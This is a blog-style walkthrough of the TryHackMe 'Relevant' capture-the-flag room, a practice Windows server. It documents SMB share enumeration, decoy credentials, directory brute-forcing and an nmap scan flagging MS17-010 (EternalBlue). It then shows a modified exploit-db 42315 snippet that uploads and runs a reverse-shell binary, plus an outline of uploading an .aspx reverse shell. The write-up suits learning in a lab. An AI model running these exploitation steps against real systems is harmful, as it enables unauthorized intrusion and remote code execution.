---
title: "TryHackMe - Relevant"
date: 2023-06-29 22:00:00 +/-0500
categories: [Cybersecurity, CTFs, TryHackMe, Windows]
tags:
  [ctf, tryHackMe, cybersecurity, windows, smb, nmap, ms17-010]
---

## Challenge: Relevant

## Recon

### NMAP

I was not able to find any clues from the initial Nmap scans and other tools
that I used. So I looked up the official writeup, and the author suggests to run
a scan that detects the open ports and then run more focused Nmap scan on them.
He created a tool `threader3000` and I decided to give it a try.

The result showed that port 80, 139, 135, 445, 3389, 5985, 49663, 49666, and
49668. And these 40,000s are commonly used for backend operations within virtual
environments such as AWS.

Once his Python script finishes the port scanning, it suggests a nmap command to
run. The result is:

```
PORT      STATE SERVICE       VERSION 80/tcp    open  http
Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |
http-methods: |_  Potentially risky methods: TRACE |_http-title: IIS Windows
Server 135/tcp   open  msrpc         Microsoft Windows RPC 139/tcp   open
netbios-ssn   Microsoft Windows netbios-ssn 445/tcp   open  microsoft-ds
Windows Server 2016 Standard Evaluation 14393 microsoft-ds 3389/tcp  open
ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject:
commonName=Relevant | Not valid before: 2023-06-27T17:18:59 |_Not valid after:
2023-12-27T17:18:59 |_ssl-date: 2023-06-28T18:10:32+00:00; +1s from scanner
time. | rdp-ntlm-info: |   Target_Name: RELEVANT |   NetBIOS_Domain_Name:
RELEVANT |   NetBIOS_Computer_Name: RELEVANT |   DNS_Domain_Name: Relevant |
DNS_Computer_Name: Relevant |   Product_Version: 10.0.14393 |_  System_Time:
2023-06-28T18:09:52+00:00 5985/tcp  open  http          Microsoft HTTPAPI httpd
2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not
Found 49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0 | http-methods: |_  Potentially risky
methods: TRACE |_http-title: IIS Windows Server 49667/tcp open  msrpc
Microsoft Windows RPC 49669/tcp open  msrpc         Microsoft Windows RPC MAC
Address: 02:CF:CE:A0:45:4F (Unknown) Service Info: OSs: Windows, Windows Server
2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results: | smb-security-mode: |   account_used: guest |
authentication_level: user |   challenge_response: supported |_
message_signing: disabled (dangerous, but default) |_clock-skew: mean: 1h24m00s,
deviation: 3h07m50s, median: 0s | smb2-time: |   date: 2023-06-28T18:09:51 |_
start_date: 2023-06-28T17:19:24 |_nbstat: NetBIOS name: RELEVANT, NetBIOS user:
<unknown>, NetBIOS MAC: 02cfcea0454f (unknown) | smb-os-discovery: |   OS:
Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard
Evaluation 6.3) |   Computer name: Relevant |   NetBIOS computer name:
RELEVANT\x00 |   Workgroup: WORKGROUP\x00 |_  System time:
2023-06-28T11:09:52-07:00 | smb2-security-mode: |   311: |_    Message signing
enabled but not required

Service detection performed. Please report any incorrect results at
https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 97.54
seconds
```


### Port 80

If we access the web page, we will see a default web page that indicates it is
for Windows Server Internet Information Services.  This tells us that there is a
web server running but that is about it. The nmap result shows it is using
Microsoft IIS 10.0 (which was considered as the highest version at that moment
and still it is), we are not likely to find any vulnerabilities related to this.

### Port 445: SMB

Since SMB is open, we will run:

`smbclient -L \\\\<IP>\\`.

The result shows:

```
smbclient -L 10.10.240.251 Password for [WORKGROUP\root]:

Sharename       Type      Comment ---------       ----      ------- ADMIN$
Disk      Remote Admin C$              Disk      Default share IPC$
IPC       Remote IPC nt4wrksv        Disk      Reconnecting with SMB1 for
workgroup listing. do_connect: Connection to 10.10.240.251 failed (Error
NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup
available
```

I didn't think about checking the sharename 'nt4wrksv', but the author did check
on the share. Let's check that share by running:

`smbclient \\\\10.10.240.251\\nt4wrksv`

Once you get in without entering any password, you will be able see a text file
`password.txt` if you run `dir` command. The content of the password file is

```
[User Passwords - Encoded] Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

It looks like base64-encoded strings. We can either use online tools or use
`base64` command line tool to decrypt this.

`echo "<some_base64-encoded_string> | base64 -d"`

The result of decrypting the first line is `Bob - !P@$$W0rD!123`. The second
line gives you `Bill - Juw4nnaM4n420696969!$$$`. What could we do with these
credentials? We can try these credentials on `evil-winrm`.

`evil-winrm -i <ip> -u <username> -p <password>`

However, the author has put this in to show people that sometimes somethings are
too good to be true (meaning these passwords are useless). And he stresses that
'believe in what you see - if those credentials do not work for anything, that
means they are nothing'.

**Note**: We can also try to use `psexec.py`. Take a look at this.

### Port 3389

Since port 3389 is open, I ran a nmap scripts that would check for rdp related
vulnerabilities.

`nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p
3389 -T4 <IP>`

Nothing was found. So I think running  tools such as `crackmapexec` wouldn't
matter at this point since there is not an account that is interesting to be
used.

### Port 49663

Oh well, I don't know how/why I did not think about looking at this port when it
apparently shows the second web server - another Microsoft IIS. And it shows
that there is a potentially risky HTTP method `TRACE`. According to OWASP, this
can be used as a `Cross-Site Tracking (XST)` -
[referencel](https://owasp.org/www-community/attacks/Cross_Site_Tracing). So I
tried this example command from the article `curl -X TRACE <ip>:49663`, but it
did not give anything back.

The author uses `dirsearch` which I don't think I used before, so I will give it
a shot. He uses a command that looks like this:

- `dirsearch.py -u <ip> -e -x 400,500 -r -t 100 -w <path_to_wordlist>` -u: URL
- -e: All extensions -x: Exclude ports specified -r: Brute-force recursively (a
- single level) -t: Number of threads used -w: File path to a word list

**Warning**: Somehow I was not able to run `dirsearch` on the server. So,
instead, I ran `gobuster` instead.

`gobuster dir -u <ip> -w <path_to_wordlist>`

After the run, you will see that there is one match, `nt4wrksv` directory
which we saw from one of the sharenames. So, after finding that out, if I go
to `<ip>/nt4wrksv`, it shows a blank page in black.

## Vulnerability Check

Maybe, once we find out the open ports from the Nmap scans, I should try to run
this command to see if there are any known vulnerabilities:

`nmap -oA nmap-vuln -Pn -script vuln -p 80,135,139,445,3389 <ip>`

Although I have run vulnerability searches related to SMB and RDP, but this will
do the whole vulnerabilities that it can find.

```
nmap -Pn --script vuln -p 80,135,139,445,3389 10.10.245.179 Starting Nmap
7.93 ( https://nmap.org ) at 2023-06-28 20:15 UTC Nmap scan report for
ip-10-10-245-179.eu-west-1.compute.internal (10.10.245.179) Host is up (0.0066s
latency).

PORT     STATE SERVICE 80/tcp   open  http |_http-dombased-xss: Couldn't find
any DOM based XSS. |_http-stored-xss: Couldn't find any stored XSS
vulnerabilities. |_http-csrf: Couldn't find any CSRF vulnerabilities. 135/tcp
open  msrpc 139/tcp  open  netbios-ssn 445/tcp  open  microsoft-ds 3389/tcp open
ms-wbt-server MAC Address: 02:CF:DF:34:15:2B (Unknown)

Host script results: |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d
to debug) |_smb-vuln-ms10-054: false | smb-vuln-ms17-010: |   VULNERABLE: |
Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) |
State: VULNERABLE |     IDs:  CVE:CVE-2017-0143 |     Risk factor: HIGH |
A critical remote code execution vulnerability exists in Microsoft SMBv1 |
servers (ms17-010). |           |     Disclosure date: 2017-03-14 |
References: |
https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 200.99 seconds
```

The result shows that there can be ms17-010 which indicates `EternalBlue`
vulnerability. I knew this! I should have known this when I saw that SMBv1 was
listed (although I was trying to make the exploit work but could not).

## MS17-010

### There are two ways

1. Follow the author's instruction
2. Somehow make the AutoBlue script work by fixing the indentation problem...

#### The author's way

What the author does to see if the server is exploitable is by checking to see
if the server somehow uses the same directory as the SMB share!

So, if we were to test accessing`<ip>/nt4wrksv/passwords.txt`, we will see the
contents of `passwords.txt`. So, knowing this, using smbclient, we can upload a
reverse shell onto the system simply (he did choose to use a `.aspx` extension
as Windows IIS servers use many of those file extensions). After that, he checks
what kind of privilege the user account has and do further exploitations there
to escalate the privilege -
[writeup](https://medium.themayor.tech/relevant-walk-through-on-tryhackme-f7dedfcb00dc).

#### Using original 42315.py

Indentation correction in python -
[https://iqbalnaved.wordpress.com/2013/12/09/vim-tip-how-to-fix-python-exception-indentationerror/](https://iqbalnaved.wordpress.com/2013/12/09/vim-tip-how-to-fix-python-exception-indentationerror/)

This was something that I had to resolve when using VM's default vim where,
after modifying code, it would complain about wrong indentations.


- Original MS17-010 python script from exploit-db.com Referred to:
  - https://infosecwriteups.com/tryhackme-relevant-ctf-write-up-7705501b73dd
  - [https://www.exploit-db.com/exploits/42315](https://www.exploit-db.com/exploits/42315)
    - This was written for python2 versions so I had to use Python2.7
    - If pip2.7 isot installed, you can do:
    - `wget https://bootstrap.pypa.io/pipi/2.7/get-pip.py`
      - if doesn't work, run `curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py` instead
    - run the `get-pip.py` with python2.7
    - once pip2.7 is installed, you will need the impacket module:
      - `pip2.7 install --update setuptools`
      - `pip2.7 install impacket`

  - If there are username, password that you can use, modify the script to enter
      them
  - To launch a reverse shell (have a reverse shell ready), changing some code is required
    - using `smb_send_file() and service_exec()` instead of the five lines above them

```
def smb_pwn(conn, arch): smbConn = conn.get_smbconnection()

#print('creating file c:\\pwned.txt on the target') #tid2 =
smbConn.connectTree('C$') #fid2 = smbConn.createFile(tid2, '/pwned.txt')
#smbConn.closeFile(tid2, fid2) #smbConn.disconnectTree(tid2)

smb_send_file(smbConn, 'rev.exe', 'C', '/rev.exe') service_exec(conn,
r'c:\rev.exe') # Note: there are many methods to get shell over SMB admin
session # a simple method to get shell (but easily to be detected by AV) is #
executing binary generated by "msfvenom -f exe-service ..."
```

- Python 3 working version of MS17-010 scripts:
  - https://github.com/3ndG4me/AutoBlue-MS17-010/tree/master
  - Didn't get to work this script out

---

Overall, this challenge allowed me to learn how to use/modify the resources that
I can find online and adjust the way they are used for my own cases. Another
interesting challenge!


